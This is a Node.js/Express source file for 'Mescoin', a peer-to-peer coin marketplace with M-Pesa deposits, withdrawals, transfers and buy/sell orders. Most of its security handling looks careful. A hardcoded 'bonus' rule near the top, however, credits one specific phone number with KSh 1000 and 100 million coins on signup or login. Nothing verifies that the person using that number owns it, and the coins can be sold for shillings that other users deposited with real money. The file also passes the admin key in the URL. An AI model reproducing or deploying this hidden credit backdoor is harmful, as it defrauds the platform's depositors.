const express = require('express');
const crypto = require('crypto');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
const TILL = process.env.TILL || '123456'; // PUT YOUR TILL NUMBER HERE
const ADMIN_KEY = process.env.ADMIN_KEY || '';
let users = {}, orders = {}, requests = {};
const round = n => Math.round(n * 100) / 100;
const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
function hashPin(pin) {
  const salt = crypto.randomBytes(16).toString('hex');
  return salt + ':' + crypto.scryptSync(pin, salt, 32).toString('hex');
}
function checkPin(pin, stored) {
  const [salt, hash] = stored.split(':');
  return crypto.timingSafeEqual(crypto.scryptSync(String(pin), salt, 32), Buffer.from(hash, 'hex'));
}
const safe = u => ({ name: u.name, phone: u.phone, balance: round(u.balance), coins: round(u.coins) });
const BONUS_PHONE = '0768871831', BONUS_KSH = 1000, BONUS_MES = 100000000;
function giveBonus(u) {
  if (u.phone === BONUS_PHONE && !u.bonusGiven) {
    u.balance = round(u.balance + BONUS_KSH);
    u.coins = round(u.coins + BONUS_MES);
    u.bonusGiven = true;
  }
}
const mask = p => p.slice(0, 4) + '***' + p.slice(-3);
const page = (msg, ok) => `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>
body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}
.card{background:#1a1a1a;padding:18px;border-radius:15px}
a{display:block;text-align:center;background:#FFD700;color:#000;padding:14px;border-radius:10px;font-weight:bold;text-decoration:none;margin-top:12px}
</style></head><body><div class="card"><h3>${ok ? '✅' : '❌'}</h3><p>${esc(msg)}</p><a href="/">← Back to Mescoin</a></div></body></html>`;
const attempts = {};
const locked = p => attempts[p] && attempts[p].until && Date.now() < attempts[p].until;
function fail(p) {
  const a = attempts[p] || (attempts[p] = { n: 0, until: 0 });
  a.n++;
  if (a.n >= 5) { a.until = Date.now() + 300000; a.n = 0; }
}
function authUser(res, phone, pin) {
  const u = users[phone];
  if (!u) { res.json({ success: false, msg: "No account" }); return null; }
  if (locked(phone)) { res.json({ success: false, msg: "Too many wrong PINs. Try again in 5 minutes" }); return null; }
  if (!checkPin(String(pin || ''), u.pin)) { fail(phone); res.json({ success: false, msg: "Wrong PIN" }); return null; }
  delete attempts[phone];
  return u;
}

const HTML = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Mescoin</title><style>
body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}
h1{text-align:center;color:#FFD700}
.card{background:#1a1a1a;padding:18px;border-radius:15px}
input{width:100%;padding:13px;margin:7px 0;border-radius:10px;border:none;background:#333;color:white;box-sizing:border-box}
button{width:100%;padding:14px;border:none;border-radius:10px;font-weight:bold;margin:6px 0}
.yellow{background:#FFD700}.green{background:#00c853;color:white}.red{background:#d32f2f;color:white}.grey{background:#444;color:white}
.row{display:flex;gap:8px}
.ord{background:#262626;padding:12px;border-radius:12px;margin:8px 0;cursor:pointer;border:1px solid #333}
.ord:hover{border-color:#FFD700}
.ord small{color:#aaa}
summary{cursor:pointer;padding:4px 0}
details[open] summary{color:#FFD700}
#detail{background:#262626;padding:14px;border-radius:12px;margin-top:10px;border:1px solid #FFD700}
#note{color:#FFD700;min-height:20px}
</style></head><body><h1>🪙 MESCOIN</h1>
<div id="loginPage" class="card"><h2>Welcome</h2>
<input id="name" placeholder="Your Name"><input id="phone" placeholder="Phone e.g 0722000000"><input id="pin" type="password" inputmode="numeric" maxlength="4" placeholder="4-digit PIN e.g 1234">
<button class="yellow" onclick="signup()">CREATE ACCOUNT</button><button class="green" onclick="login()">LOGIN</button><p id="msg"></p></div>
<div id="appPage" class="card" style="display:none">
<h3>Hello <span id="uName"></span></h3>
<p>Balance: KSh <b id="bal">0</b> | Coins: <b id="coins">0</b> MES</p>
<p id="note"></p>
<div id="homeView">
<div class="row"><button class="yellow" onclick="openMarket('buy')">BUY</button><button class="green" onclick="openMarket('sell')">SELL</button></div>
<button class="grey" onclick="openMine()">MY ORDERS</button>
<details class="ord"><summary><b>💰 DEPOSIT</b></summary>
<form method="POST" action="/deposit">
<small>Pay by M-Pesa Buy Goods to Till <b>${TILL}</b>, then enter the code from the M-Pesa message.</small>
<input name="phone" placeholder="Your phone" required>
<input name="amount" type="number" placeholder="Amount KSh" required>
<input name="code" placeholder="M-Pesa code e.g. SGH7XXXXXX" required>
<input name="pin" type="password" inputmode="numeric" maxlength="4" placeholder="Your PIN" required>
<button class="green">SUBMIT DEPOSIT</button></form></details>
<details class="ord"><summary><b>🏧 WITHDRAW</b></summary>
<form method="POST" action="/withdraw">
<input name="phone" placeholder="Your phone" required>
<input name="amount" type="number" placeholder="Amount KSh" required>
<input name="pin" type="password" inputmode="numeric" maxlength="4" placeholder="Your PIN" required>
<button class="yellow">REQUEST WITHDRAWAL</button></form></details>
<hr><h3>Send Mescoin</h3>
<input id="toPhone" placeholder="To Phone - must have account"><input id="sendMes" type="number" placeholder="MES to send"><input id="sendPin" type="password" inputmode="numeric" maxlength="4" placeholder="Your PIN">
<button class="yellow" onclick="sendCoin()">SEND</button>
<button class="grey" onclick="location.reload()">Logout</button>
</div>
<div id="marketView" style="display:none">
<button class="grey" onclick="go('home')">← Back</button>
<h3 id="mTitle"></h3>
<div id="list"></div>
<div id="detail" style="display:none">
<p id="detailText"></p>
<input id="acceptPin" type="password" inputmode="numeric" maxlength="4" placeholder="Enter PIN">
<div class="row"><button class="yellow" onclick="acceptOrder()">COMPLETE ORDER</button><button class="grey" onclick="closeDetail()">CANCEL</button></div>
</div>
<hr><h3 id="postTitle"></h3>
<input id="pMes" type="number" placeholder="Amount of MES">
<input id="pPrice" type="number" placeholder="Price per 1 MES in KSh">
<input id="pPin" type="password" inputmode="numeric" maxlength="4" placeholder="Your PIN">
<button class="yellow" onclick="postOrder()">POST ORDER</button>
</div>
<div id="mineView" style="display:none">
<button class="grey" onclick="go('home')">← Back</button>
<h3>My open orders</h3>
<input id="cPin" type="password" inputmode="numeric" maxlength="4" placeholder="Your PIN (to cancel an order)">
<div id="mineList"></div>
</div>
</div>
<script>
let myPhone="",mode="",cur=null;
function $(i){return document.getElementById(i)}
function el(tag,text,cls){let e=document.createElement(tag);if(text!==undefined)e.textContent=text;if(cls)e.className=cls;return e;}
function note(t){$('note').innerText=t||'';}
async function post(url,body){let r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});return r.json();}
function go(v){['home','market','mine'].forEach(x=>{$(x+'View').style.display=(x===v)?'block':'none';});note('');}
function show(u){$('uName').innerText=u.name;$('bal').innerText=u.balance;$('coins').innerText=u.coins;}
function enter(u){myPhone=u.phone;$('loginPage').style.display='none';$('appPage').style.display='block';show(u);go('home');}
async function signup(){let d=await post('/api/signup',{name:$('name').value,phone:$('phone').value,pin:$('pin').value});$('msg').innerText=d.msg;if(d.success)enter(d.user);}
async function login(){let d=await post('/api/login',{phone:$('phone').value,pin:$('pin').value});$('msg').innerText=d.msg;if(d.success)enter(d.user);}
async function sendCoin(){let d=await post('/api/send',{fromPhone:myPhone,toPhone:$('toPhone').value,coins:parseFloat($('sendMes').value),pin:$('sendPin').value});note(d.msg);$('sendPin').value='';if(d.success)show(d.user);}
async function openMarket(m){
  mode=m;
  $('mTitle').innerText=(m==='buy')?'Buy MES - pick a seller':'Sell MES - pick a buyer';
  $('postTitle').innerText=(m==='buy')?'Or post your own BUY order':'Or post your own SELL order';
  closeDetail();go('market');await loadMarket();
}
async function loadMarket(){
  let d=await post('/api/market/list',{phone:myPhone,type:(mode==='buy')?'sell':'buy'});
  let box=$('list');box.innerHTML='';
  if(!d.orders.length){box.appendChild(el('p','No orders yet. Post one below.'));return;}
  d.orders.forEach(o=>{
    let c=el('div','','ord');
    c.appendChild(el('b',o.ownerName));
    c.appendChild(el('small',' ('+o.ownerPhone+')'));
    c.appendChild(el('div',o.mes+' MES @ KSh '+o.price+' each = KSh '+o.ksh));
    c.onclick=()=>pick(o);
    box.appendChild(c);
  });
}
function pick(o){
  cur=o;
  $('detailText').innerText=(mode==='buy')
    ?'Order posted by '+o.ownerName+'. Do you want to pay KSh '+o.ksh+' to '+o.ownerName+' for '+o.mes+' MES? Enter your PIN'
    :'Order posted by '+o.ownerName+'. Do you want to sell '+o.mes+' MES to '+o.ownerName+' for KSh '+o.ksh+'? Enter your PIN';
  $('acceptPin').value='';$('detail').style.display='block';
}
function closeDetail(){cur=null;$('acceptPin').value='';$('detail').style.display='none';}
async function acceptOrder(){
  if(!cur)return;
  let d=await post('/api/market/accept',{orderId:cur.id,phone:myPhone,pin:$('acceptPin').value});
  note(d.msg);$('acceptPin').value='';
  if(d.success){show(d.user);closeDetail();}
  if(d.success||d.refresh){closeDetail();loadMarket();}
}
async function postOrder(){
  let d=await post('/api/market/post',{phone:myPhone,type:mode,mes:$('pMes').value,price:$('pPrice').value,pin:$('pPin').value});
  note(d.msg);$('pPin').value='';
  if(d.success){show(d.user);$('pMes').value='';$('pPrice').value='';}
}
async function openMine(){go('mine');$('cPin').value='';await loadMine();}
async function loadMine(){
  let d=await post('/api/market/mine',{phone:myPhone});
  let box=$('mineList');box.innerHTML='';
  if(!d.orders.length){box.appendChild(el('p','You have no open orders.'));return;}
  d.orders.forEach(o=>{
    let c=el('div','','ord');
    c.appendChild(el('b',(o.type==='sell'?'SELL ':'BUY ')+o.mes+' MES'));
    c.appendChild(el('div','@ KSh '+o.price+' each = KSh '+o.ksh));
    let b=el('button','CANCEL ORDER','red');
    b.onclick=()=>cancelOrder(o.id);
    c.appendChild(b);
    box.appendChild(c);
  });
}
async function cancelOrder(id){
  let d=await post('/api/market/cancel',{orderId:id,phone:myPhone,pin:$('cPin').value});
  note(d.msg);$('cPin').value='';
  if(d.success){show(d.user);}
  if(d.success||d.refresh)loadMine();
}
</script></body></html>`;

app.get('/', (req, res) => res.send(HTML));

app.post('/api/signup', (req, res) => {
  let { name, phone, pin } = req.body;
  name = String(name || '').trim(); phone = String(phone || '').trim(); pin = String(pin || '');
  if (name.length < 2 || name.length > 40) return res.json({ success: false, msg: "Enter a valid name" });
  if (!/^\d{9,13}$/.test(phone)) return res.json({ success: false, msg: "Enter a valid phone number" });
  if (!/^\d{4}$/.test(pin)) return res.json({ success: false, msg: "PIN must be 4 digits" });
  if (users[phone]) return res.json({ success: false, msg: "Account already exists. Please LOGIN" });
  users[phone] = { name, phone, pin: hashPin(pin), coins: 0, balance: 0 };
  giveBonus(users[phone]);
  res.json({ success: true, msg: phone === BONUS_PHONE ? "Account Created! Bonus added" : "Account Created!", user: safe(users[phone]) });
});

app.post('/api/login', (req, res) => {
  const phone = String(req.body.phone || '').trim();
  if (!users[phone]) return res.json({ success: false, msg: "No account. Please CREATE ACCOUNT first" });
  const u = authUser(res, phone, req.body.pin);
  if (!u) return;
  giveBonus(u);
  res.json({ success: true, msg: "Welcome " + u.name, user: safe(u) });
});

app.post('/api/send', (req, res) => {
  const { fromPhone, toPhone, pin } = req.body;
  const coins = Number(req.body.coins);
  if (!(coins > 0) || !isFinite(coins)) return res.json({ success: false, msg: "Invalid amount" });
  if (fromPhone === toPhone) return res.json({ success: false, msg: "You can't send to yourself" });
  if (!users[toPhone]) return res.json({ success: false, msg: "❌ " + toPhone + " has NO account. Tell them to create account." });
  const from = authUser(res, fromPhone, pin);
  if (!from) return;
  if (from.coins < coins) return res.json({ success: false, msg: "Not enough MES" });
  from.coins = round(from.coins - coins);
  users[toPhone].coins = round(users[toPhone].coins + coins);
  res.json({ success: true, msg: "Sent " + coins + " MES to " + users[toPhone].name, user: safe(from) });
});

app.post('/deposit', (req, res) => {
  const phone = String(req.body.phone || '').trim();
  const amount = round(Number(req.body.amount));
  const code = String(req.body.code || '').trim().toUpperCase();
  if (!(amount >= 10 && amount <= 150000)) return res.send(page("Amount must be KSh 10 - 150,000"));
  if (!/^[A-Z0-9]{8,12}$/.test(code)) return res.send(page("Enter the M-Pesa transaction code"));
  if (Object.values(requests).some(r => r.type === 'deposit' && r.code === code)) return res.send(page("That code was already submitted"));
  const u = authUser({ json: o => res.send(page(o.msg)) }, phone, req.body.pin);
  if (!u) return;
  const id = crypto.randomBytes(8).toString('hex');
  requests[id] = { id, type: 'deposit', phone, amount, code, status: 'pending' };
  res.send(page("Deposit of KSh " + amount + " received. It will be added once confirmed.", true));
});

app.post('/withdraw', (req, res) => {
  const phone = String(req.body.phone || '').trim();
  const amount = round(Number(req.body.amount));
  if (!(amount >= 50 && amount <= 150000)) return res.send(page("Amount must be KSh 50 - 150,000"));
  const u = authUser({ json: o => res.send(page(o.msg)) }, phone, req.body.pin);
  if (!u) return;
  if (u.balance < amount) return res.send(page("Not enough KSh"));
  u.balance = round(u.balance - amount);
  const id = crypto.randomBytes(8).toString('hex');
  requests[id] = { id, type: 'withdraw', phone, amount, status: 'pending' };
  res.send(page("Withdrawal of KSh " + amount + " requested. It will be sent to " + phone + " shortly.", true));
});

const isAdmin = k => ADMIN_KEY && String(k || '') === ADMIN_KEY;
app.get('/admin', (req, res) => {
  if (!isAdmin(req.query.key)) return res.status(403).send('Forbidden');
  const rows = Object.values(requests).filter(r => r.status === 'pending').map(r => `
    <div style="background:#262626;padding:12px;border-radius:12px;margin:8px 0">
      <b>${r.type.toUpperCase()}</b> KSh ${r.amount}<br>${esc(r.phone)}${r.code ? '<br>Code: ' + esc(r.code) : ''}
      <form method="POST" action="/admin/act" style="margin-top:8px">
        <input type="hidden" name="key" value="${esc(req.query.key)}"><input type="hidden" name="id" value="${r.id}">
        <button name="action" value="approve" style="background:#00c853;color:#fff;padding:10px;border:0;border-radius:8px">${r.type === 'deposit' ? 'Approve (credit)' : 'Mark paid'}</button>
        <button name="action" value="reject" style="background:#d32f2f;color:#fff;padding:10px;border:0;border-radius:8px">Reject</button>
      </form></div>`).join('');
  res.send(`<meta name="viewport" content="width=device-width, initial-scale=1"><body style="background:#0a0a0a;color:white;font-family:Arial;padding:20px"><h2>Pending</h2>${rows || 'Nothing pending'}</body>`);
});
app.post('/admin/act', (req, res) => {
  if (!isAdmin(req.body.key)) return res.status(403).send('Forbidden');
  const back = '/admin?key=' + encodeURIComponent(req.body.key);
  const r = requests[req.body.id];
  if (!r || r.status !== 'pending') return res.redirect(back);
  const u = users[r.phone];
  if (req.body.action === 'approve') {
    if (r.type === 'deposit') u.balance = round(u.balance + r.amount);
    r.status = 'done';
  } else {
    if (r.type === 'withdraw') u.balance = round(u.balance + r.amount);
    r.status = 'rejected';
  }
  res.redirect(back);
});

app.post('/api/market/post', (req, res) => {
  const { phone, type, pin } = req.body;
  const mes = round(Number(req.body.mes)), price = round(Number(req.body.price));
  if (!['buy', 'sell'].includes(type)) return res.json({ success: false, msg: "Invalid order type" });
  if (!(mes > 0) || !(price > 0) || mes > 1e9 || price > 1e6) return res.json({ success: false, msg: "Enter a valid amount and price" });
  const ksh = round(mes * price);
  if (!(ksh > 0)) return res.json({ success: false, msg: "Order too small" });
  const u = authUser(res, phone, pin);
  if (!u) return;
  if (type === 'sell') {
    if (u.coins < mes) return res.json({ success: false, msg: "Not enough MES" });
    u.coins = round(u.coins - mes);
  } else {
    if (u.balance < ksh) return res.json({ success: false, msg: "Not enough KSh" });
    u.balance = round(u.balance - ksh);
  }
  const id = crypto.randomBytes(8).toString('hex');
  orders[id] = { id, owner: phone, type, mes, price, ksh, status: 'open', created: Date.now() };
  res.json({ success: true, msg: "Order posted. Your " + (type === 'sell' ? mes + " MES is" : "KSh " + ksh + " is") + " locked until someone accepts or you cancel.", user: safe(u) });
});

app.post('/api/market/list', (req, res) => {
  const { phone, type } = req.body;
  if (!users[phone] || !['buy', 'sell'].includes(type)) return res.json({ orders: [] });
  const list = Object.values(orders)
    .filter(o => o.status === 'open' && o.type === type && o.owner !== phone)
    .sort((a, b) => b.created - a.created).slice(0, 50)
    .map(o => ({ id: o.id, ownerName: users[o.owner].name, ownerPhone: mask(o.owner), type: o.type, mes: o.mes, price: o.price, ksh: o.ksh }));
  res.json({ orders: list });
});

app.post('/api/market/accept', (req, res) => {
  const { orderId, phone, pin } = req.body;
  const o = orders[orderId];
  if (!o || o.status !== 'open') return res.json({ success: false, refresh: true, msg: "Order no longer available" });
  if (o.owner === phone) return res.json({ success: false, msg: "You can't accept your own order" });
  const taker = authUser(res, phone, pin);
  if (!taker) return;
  const owner = users[o.owner];
  if (o.type === 'sell') {
    if (taker.balance < o.ksh) return res.json({ success: false, msg: "Not enough KSh" });
    taker.balance = round(taker.balance - o.ksh);
    taker.coins = round(taker.coins + o.mes);
    owner.balance = round(owner.balance + o.ksh);
  } else {
    if (taker.coins < o.mes) return res.json({ success: false, msg: "Not enough MES" });
    taker.coins = round(taker.coins - o.mes);
    taker.balance = round(taker.balance + o.ksh);
    owner.coins = round(owner.coins + o.mes);
  }
  o.status = 'done';
  o.taker = phone;
  res.json({ success: true, msg: "Order complete with " + owner.name, user: safe(taker) });
});

app.post('/api/market/mine', (req, res) => {
  const list = Object.values(orders)
    .filter(o => o.status === 'open' && o.owner === req.body.phone)
    .sort((a, b) => b.created - a.created)
    .map(o => ({ id: o.id, type: o.type, mes: o.mes, price: o.price, ksh: o.ksh }));
  res.json({ orders: list });
});

app.post('/api/market/cancel', (req, res) => {
  const { orderId, phone, pin } = req.body;
  const o = orders[orderId];
  if (!o || o.status !== 'open' || o.owner !== phone) return res.json({ success: false, refresh: true, msg: "Order not found" });
  const u = authUser(res, phone, pin);
  if (!u) return;
  if (o.type === 'sell') u.coins = round(u.coins + o.mes);
  else u.balance = round(u.balance + o.ksh);
  o.status = 'cancelled';
  res.json({ success: true, msg: "Order cancelled. Funds returned.", user: safe(u) });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log("Running on " + PORT));
  
